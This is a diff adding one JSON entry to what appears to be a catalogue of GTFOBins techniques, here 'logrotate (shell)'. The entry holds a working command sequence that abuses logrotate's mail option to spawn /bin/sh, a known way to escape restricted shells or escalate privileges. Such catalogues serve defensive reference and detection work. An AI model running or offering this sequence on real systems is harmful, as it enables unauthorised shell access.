@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-logrotate-shell",
+  "name": "GTFOBins · logrotate (shell)",
+  "command": "echo -e '/path/to/temp-file.config {\\nmail x@x.x\\n}' >/path/to/temp-file.config\necho '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh\nlogrotate -m /path/to/temp-file.sh -f /path/to/temp-file",
+  "description": "Use logrotate to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "logrotate",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/logrotate/#shell",
+  "upstream_id": "logrotate/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/logrotate/"
+    }
+  ]
+}
